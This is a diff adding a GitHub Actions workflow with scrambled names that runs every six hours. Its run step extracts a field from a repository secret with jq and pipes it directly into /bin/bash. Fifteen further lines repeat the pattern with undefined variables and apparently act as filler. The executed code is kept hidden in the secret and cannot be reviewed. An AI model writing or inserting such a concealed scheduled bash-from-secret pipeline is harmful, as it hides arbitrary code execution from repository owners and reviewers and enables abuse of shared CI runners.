@@ -1,0 +1,31 @@
+name: chenyatou0987
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '59 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chenyatou0987
+        env:
+          gqr04063: ${{ secrets.gqr04063 }}
+        run: |
+          echo $gqr04063 | jq -r .gp14 | /bin/bash
+          echo $ito084 | jq -r .twds0579 | /bin/bash
+          echo $aclfh1864 | jq -r .svx8 | /bin/bash
+          echo $zwx72 | jq -r .z45882 | /bin/bash
+          echo $iwd218 | jq -r .waxsz3110 | /bin/bash
+          echo $k5438 | jq -r .r147 | /bin/bash
+          echo $xk7313 | jq -r .zmnzr97568 | /bin/bash
+          echo $cgh99 | jq -r .gqciz95522 | /bin/bash
+          echo $u83 | jq -r .una1725 | /bin/bash
+          echo $aidk56607 | jq -r .ni0 | /bin/bash
+          echo $k66570 | jq -r .blfk3138 | /bin/bash
+          echo $tkma6497 | jq -r .vups8 | /bin/bash
+          echo $o1 | jq -r .mm70564 | /bin/bash
+          echo $mzio0 | jq -r .wrocv03322 | /bin/bash
+          echo $xxco59 | jq -r .lrimd82 | /bin/bash
+          echo $letgc90515 | jq -r .ld4681 | /bin/bash
+
